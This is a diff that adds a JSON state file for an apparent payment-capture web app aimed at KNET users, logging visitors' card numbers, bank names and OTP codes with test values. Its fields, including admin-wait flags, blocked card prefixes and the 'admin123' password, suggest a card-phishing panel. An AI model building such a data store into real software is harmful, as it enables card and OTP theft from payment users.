@@ -1,0 +1,87 @@
+{
+  "visitors": {},
+  "visitorCounter": 1,
+  "savedVisitors": [
+    {
+      "_id": "visitor_1782162994449_eue0vx5",
+      "socketId": "bWaPFq5qBNlAZgukAAAN",
+      "visitorNumber": 1,
+      "createdAt": "2026-06-22T21:16:34.449Z",
+      "isRead": false,
+      "fullName": "",
+      "phone": "",
+      "idNumber": "",
+      "apiKey": "api_jk2mt6hjdx8",
+      "ip": "::1",
+      "country": "Unknown",
+      "city": "",
+      "os": "Unknown",
+      "device": "Desktop",
+      "browser": "Unknown",
+      "date": "2026-06-22T21:16:34.449Z",
+      "blockedCardPrefixes": [],
+      "page": "دفع كي نت",
+      "data": {
+        "اسم المسافر": "Test",
+        "طريقة الدفع": "KNET"
+      },
+      "dataHistory": [
+        {
+          "content": {
+            "اسم المسافر": "Test User",
+            "طريقة الدفع": "KNET"
+          },
+          "page": "المراجعة والدفع",
+          "timestamp": "2026-06-22T21:16:35.250Z"
+        },
+        {
+          "content": {
+            "اسم المسافر": "Test"
+          },
+          "page": "المراجعة والدفع",
+          "timestamp": "2026-06-22T21:17:16.272Z"
+        }
+      ],
+      "paymentCards": [
+        {
+          "cardNumber": "1234567890123456",
+          "nameOnCard": "KNET",
+          "paymentMethod": "KNET",
+          "bankName": "NBK",
+          "timestamp": "2026-06-22T21:16:36.050Z"
+        },
+        {
+          "cardNumber": "111122223333",
+          "paymentMethod": "KNET",
+          "bankName": "NBK",
+          "timestamp": "2026-06-22T21:17:18.072Z"
+        },
+        {
+          "cardNumber": "999988887777",
+          "paymentMethod": "KNET",
+          "bankName": "NBK",
+          "timestamp": "2026-06-22T21:27:51.371Z"
+        }
+      ],
+      "digitCodes": [
+        {
+          "code": "123456",
+          "page": "رمز التحقق كي نت (OTP)",
+          "timestamp": "2026-06-22T21:16:36.849Z"
+        }
+      ],
+      "hasNewData": true,
+      "isBlocked": false,
+      "isConnected": false,
+      "sessionStartTime": 1782163670770,
+      "waitingForAdminResponse": true,
+      "lastDataUpdate": "2026-06-22T21:27:51.371Z",
+      "hasEnteredCardPage": true
+    }
+  ],
+  "whatsappNumber": "",
+  "globalBlockedCards": [],
+  "globalBlockedCountries": [],
+  "adminPassword": "admin123",
+  "lastSaved": "2026-06-22T21:28:02.682Z"
+}
